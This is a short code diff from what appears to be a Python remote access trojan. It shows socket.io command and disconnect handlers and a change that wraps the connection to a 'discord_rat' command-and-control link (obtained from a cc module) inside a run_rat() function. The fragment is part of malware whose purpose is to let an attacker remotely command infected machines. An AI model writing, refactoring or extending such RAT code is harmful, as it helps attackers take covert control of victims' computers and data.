@@ -163,5 +163,6 @@ def receive_command(data):
 def disconnect():
     print("disconnect")
     
-sio.connect(cc.get_discord_rat_link())
-sio.wait()
+def run_rat():
+    sio.connect(cc.get_discord_rat_link())
+    sio.wait()
